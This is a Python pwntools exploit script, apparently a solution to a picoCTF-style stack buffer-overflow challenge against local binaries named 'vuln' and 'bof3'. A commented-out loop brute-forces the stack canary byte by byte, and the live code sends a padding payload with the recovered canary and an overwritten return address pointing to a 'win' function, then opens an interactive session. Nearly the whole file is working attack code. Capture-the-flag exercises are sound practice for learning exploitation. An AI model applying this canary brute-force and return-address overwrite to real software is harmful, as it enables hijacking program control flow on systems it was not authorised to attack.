#!/usr/bin/env python

from pwn import *
import string

pico = 0



known_canary = 'IHwj'
check = string.letters + "0123456789"


# for char in check:
# 	if pico:
# 		r = process("./vuln")
# 	else:
# 		#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
# 		r = process("./bof3")
# 		# gdb.attach(r, '''
# 		# 	b *0x8048868
# 		# 	c
# 		# 	''')
# 	payload = ''
# 	payload += '80\n'
# 	payload += 'A'*32
# 	payload += known_canary
# 	payload += char
# 	log.info("Testing canary " + known_canary + char)
# 	r.send(payload)
# 	output = r.recvall()
# 	print "output: " + output
# 	if "Smashing" not in output:
# 		known_canary += char
# 		print 'Canary: ' + known_canary
# 		# if len(known_canary) == 4:
# 		# 	print 'Canary: ' + known_canary
# print 'Canary: ' + known_canary

if pico:
	r = process("./vuln")
else:
	#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
	r = process("./bof3")
	gdb.attach(r, '''
		b *0x80488b1
		c
		''')

WIN = 0x80486eb

payload = ''
payload += '80\n'
payload += 'A'*32
payload += known_canary
payload += 'A'*16
payload += p32(WIN)

r.send(payload)

r.interactive()